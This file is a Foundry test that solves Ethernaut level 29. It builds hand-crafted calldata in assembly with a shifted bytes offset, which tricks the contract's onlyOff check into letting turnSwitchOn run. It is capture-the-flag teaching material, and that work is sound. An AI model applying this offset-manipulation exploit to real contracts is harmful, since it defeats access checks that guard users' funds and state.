// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level29 {
    function turnSwitchOff() external;
    function turnSwitchOn() external;
    function flipSwitch(bytes memory) external;
}

contract Level29Test is EthernautTest {
    function testLevel29() public {
        _createLevel("29");

        Level29 level29Instance = Level29(levelInstance["29"]);

        // The onlyOff modifier assumes that the bytes calldata is
        // offset at the default offset position of 32 bytes
        // However, we could set it differently! So, to bypass the
        // check, we can put the turnSwitchOff selector in the expected place
        // then put the turnSwitchOn selector in the place our new
        // offset points to! :)
        // Lets create the calldata with assembly!
        bytes4 flip = Level29.flipSwitch.selector;
        bytes4 off = Level29.turnSwitchOff.selector;
        bytes4 on = Level29.turnSwitchOn.selector;
        bytes memory data = new bytes(164);
        assembly ("memory-safe") {
            mstore(add(data, 32), flip) // Store flip function selector
            // The offset must be a multiple of 32
            // but greater than 72 bytes which is where we will put the
            // selector for turnSwitchOff to trick onlyOff
            mstore(add(data, 36), 96) // Set offset to 96
            mstore(add(data, 100), off) // Put off selector at the expected position
            mstore(add(data, 132), 4) // Put size of on selector at 96
            mstore(add(data, 164), on) // Put off selector
        }

        // Lets log data so we can see exactly the calldata we will send
        console2.logBytes(data);

        // Then call the contract
        address(level29Instance).call(data);

        require(_submitLevel("29"));
    }
}
